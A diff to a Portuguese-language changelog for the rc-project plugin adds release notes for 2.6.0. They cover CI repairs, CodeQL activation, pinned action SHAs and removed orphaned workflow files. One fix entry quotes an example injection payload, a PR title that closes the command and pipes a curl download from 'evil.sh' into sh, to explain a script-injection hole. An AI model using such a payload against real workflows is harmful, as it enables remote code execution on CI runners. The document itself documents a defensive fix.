@@ -4,6 +4,54 @@
 
 _Nada ainda — registre aqui as mudanças da próxima versão sob `### Added` / `### Changed` / `### Fixed` / `### Removed`, movendo-as para uma seção versionada no release._
 
+## [2.6.0] - 2026-07-14
+
+Release de infraestrutura: o conteúdo do plugin é idêntico ao da 2.5.0. O que mudou é
+que o CI passou a **verificar alguma coisa**. Ele era fóssil da era Go/Compozy — montava
+Go 1.26.1, Bun e Playwright e rodava `make verify` num repo que não tem nada disso —
+então **todo push que tocava `skills/` ou `scripts/` falhava** em `Set up Go with
+caching: go.mod not found`. Os "sucessos" eram vacuosos: o filtro de path pulava o job.
+
+### Added
+
+- **CI que roda o gate real** — `node scripts/plugin-smoke.mjs` + `lessons.mjs --selftest`,
+  em Node, sem build. O `paths-filter` saiu: ele existia para economizar minuto de build
+  Go; o gate roda inteiro em menos de 1s.
+- **CodeQL ligado de verdade** (`codeql.yml`). O `codeql-config.yml` existia **sem workflow
+  nenhum** — varredura de segurança que ninguém rodava, dando falsa sensação de cobertura —
+  e ainda apontava para `cmd/`, `internal/` e `rc.go`, caminhos Go inexistentes: mesmo com
+  workflow, escanearia o vazio. Agora analisa o que o repo tem: `javascript-typescript`
+  (`scripts/*.mjs`, `opencode/plugin/rc-hooks.ts`) e `actions` (os próprios workflows).
+  Push, PR e semanal.
+- **`plugin-smoke` — check `toolchain fossil`.** Um workflow não pode montar Go, Bun ou
+  `make` sem o manifesto correspondente (`go.mod`/`bun.lock`/`Makefile`) existir no repo.
+  Amarrado à realidade, não a uma blacklist de nomes — foi ele que pegou o `auto-docs.yml`.
+
+### Fixed
+
+- **Script injection no `auto-docs.yml`** (achado pelo CodeQL, `actions/code-injection`).
+  O título do PR era interpolado direto no `run:`; um título como `"; curl evil.sh | sh; #`
+  executaria no runner. Texto não-confiável agora chega ao shell só como variável de
+  ambiente, e o `pr_title` vai ao `GITHUB_OUTPUT` via heredoc (um título com quebra de linha
+  forjaria outputs extras).
+- **Tags mutáveis** (`actions/unpinned-tag`) — `claude-code-action@v1` fixada no SHA
+  `f1bd27ca` em `claude.yml` e `auto-docs.yml`.
+- **`GH_TOKEN` ausente** no step que roda `gh pr diff`/`gh pr view` do `auto-docs.yml`. Com
+  `|| true` em cada chamada, a falha era silenciosa: os arquivos de contexto podiam sair
+  vazios e o job seguia como se estivesse tudo certo.
+
+### Removed
+
+- **`auto-docs.yml` — a TASK 1 (release notes).** Mandava rodar
+  `go run github.com/rc/releasepr@v0.0.21` — módulo Go de **outro org** — para escrever em
+  `.release-notes/`, diretório que não existe, contradizendo o processo de release real
+  (CHANGELOG + tag + `gh release`). Nunca poderia ter funcionado. A geração de PR de docs
+  (TASK 2) permanece.
+- **`.github/actions/`** — as cinco composite actions (`setup-go`, `setup-bun`, `setup-node`,
+  `setup-git-cliff`, `setup-release`) estavam órfãs. Os workflows usam só actions oficiais.
+- **`.github/versions.yml`** — declarava `go: 1.26.1`, `bun`, `golangci-lint`, `cosign`,
+  `syft`; nenhum workflow o lia.
+
 ## [2.5.0] - 2026-07-14
 
 Primeira rodada real do `/rc-loop` neste repo. O backlog não foi inventado: saiu do
@@ -566,7 +614,8 @@ Sync Claude Code (project scope)
 - Initial RC release
 
 <!-- GitHub releases (apenas versões que têm seção acima e release publicado) -->
-[Unreleased]: https://github.com/rodolfochicone/rc-project/compare/v2.5.0...main
+[Unreleased]: https://github.com/rodolfochicone/rc-project/compare/v2.6.0...main
+[2.6.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.6.0
 [2.5.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.5.0
 [2.4.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.4.0
 [2.3.0]: https://github.com/rodolfochicone/rc-project/releases/tag/v2.3.0
